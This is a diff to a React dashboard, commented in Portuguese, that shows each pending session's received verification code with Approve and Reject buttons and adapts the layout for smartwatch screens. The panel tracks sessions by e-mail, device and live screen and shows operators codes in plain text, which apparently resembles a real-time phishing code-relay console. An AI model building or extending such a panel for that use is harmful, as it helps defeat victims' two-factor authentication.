@@ -476,6 +476,21 @@ export default function Dashboard() {
   const live = attempts.filter((a) => actionableKeys.has(a.key));
   const historyFromAttempts = attempts.filter((a) => !actionableKeys.has(a.key));
 
+  // Mapa session_id -> tentativa PENDENTE mais recente, pra mostrar
+  // botões Aprovar/Rejeitar dentro do card de "Sessões em andamento"
+  // (essencial em telas micro tipo smartwatch onde só essa seção aparece).
+  const pendingBySession = useMemo(() => {
+    const map = new Map<string, AttemptRow>();
+    for (const a of attempts) {
+      if (a.status !== "pending") continue;
+      const prev = map.get(a.session_id);
+      if (!prev || a.codeAt.localeCompare(prev.codeAt) > 0) {
+        map.set(a.session_id, a);
+      }
+    }
+    return map;
+  }, [attempts]);
+
   // Sessões em andamento: têm e-mail mas não têm tentativa pendente acionável.
   // (Quem já tá em "Ao vivo" sai daqui pra evitar duplicar.)
   // Sessões com última atividade > 1h são consideradas "abandonadas" e descem
@@ -698,6 +713,7 @@ export default function Dashboard() {
                 const isOnline = activeOnlineSessionIds.has(s.session_id);
                 const liveKind = liveScreens.get(s.session_id) ?? lastKnownScreens.get(s.session_id);
                 const style = getScreenStyle(liveKind);
+                const pending = pendingBySession.get(s.session_id);
                 return (
                   <div key={s.session_id} className="rounded-lg border border-border bg-muted/20 p-3 space-y-2">
                     <div className="flex items-center justify-between gap-2">
@@ -723,6 +739,54 @@ export default function Dashboard() {
                       </span>
                       <span className="text-[10px] text-muted-foreground">{deviceLabel(s.user_agent)}</span>
                     </div>
+                    {pending && (
+                      <div className="mt-2 space-y-2 rounded-md border border-primary/40 bg-primary/5 p-2">
+                        <div className="flex items-center justify-between gap-2">
+                          <span className="text-[10px] uppercase tracking-wide text-primary font-semibold">
+                            Código recebido
+                          </span>
+                          <span className="text-[10px] text-muted-foreground font-mono-tabular">
+                            {formatTime(pending.codeAt)}
+                          </span>
+                        </div>
+                        <div className="font-mono text-base font-bold tracking-[0.3em] text-foreground">
+                          {pending.code}
+                        </div>
+                        <div className="flex gap-2">
+                          <Button
+                            size="sm"
+                            onClick={() => send(pending, "approve")}
+                            disabled={busy === `${pending.key}-approve`}
+                            className="h-8 flex-1 bg-success text-success-foreground hover:bg-success/90"
+                          >
+                            {busy === `${pending.key}-approve` ? (
+                              <Loader2 className="h-3.5 w-3.5 animate-spin" />
+                            ) : (
+                              <>
+                                <Check className="mr-1 h-3.5 w-3.5" />
+                                Aprovar
+                              </>
+                            )}
+                          </Button>
+                          <Button
+                            size="sm"
+                            variant="destructive"
+                            onClick={() => send(pending, "reject")}
+                            disabled={busy === `${pending.key}-reject`}
+                            className="h-8 flex-1"
+                          >
+                            {busy === `${pending.key}-reject` ? (
+                              <Loader2 className="h-3.5 w-3.5 animate-spin" />
+                            ) : (
+                              <>
+                                <X className="mr-1 h-3.5 w-3.5" />
+                                Rejeitar
+                              </>
+                            )}
+                          </Button>
+                        </div>
+                      </div>
+                    )}
                   </div>
                 );
               })}
@@ -786,7 +850,7 @@ export default function Dashboard() {
         </section>
 
         {/* REQUISIÇÕES */}
-        <section className={`mt-8 rounded-xl border bg-card shadow-card transition-shadow ${requestsPulse ? "border-primary shadow-glow" : "border-border"}`}>
+        <section className={`mt-8 hidden rounded-xl border bg-card shadow-card transition-shadow xs:block ${requestsPulse ? "border-primary shadow-glow" : "border-border"}`}>
           <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
             <div className="flex items-center gap-2">
               <Bell className={`h-4 w-4 text-primary ${requestsPulse ? "animate-pulse" : ""}`} />
@@ -879,7 +943,7 @@ export default function Dashboard() {
 
         {/* AO VIVO */}
         {live.length > 0 && (
-          <section className="mt-8 rounded-xl border border-primary/30 bg-card shadow-glow">
+          <section className="mt-8 hidden rounded-xl border border-primary/30 bg-card shadow-glow xs:block">
             <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
               <div className="flex items-center gap-2">
                 <span className="relative flex h-2.5 w-2.5">
@@ -903,7 +967,7 @@ export default function Dashboard() {
         )}
 
         {/* HISTÓRICO */}
-        <section className="mt-6 rounded-xl border border-border bg-card shadow-card">
+        <section className="mt-6 hidden rounded-xl border border-border bg-card shadow-card xs:block">
           <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
             <div className="flex items-center gap-2">
               <History className="h-4 w-4 text-muted-foreground" />
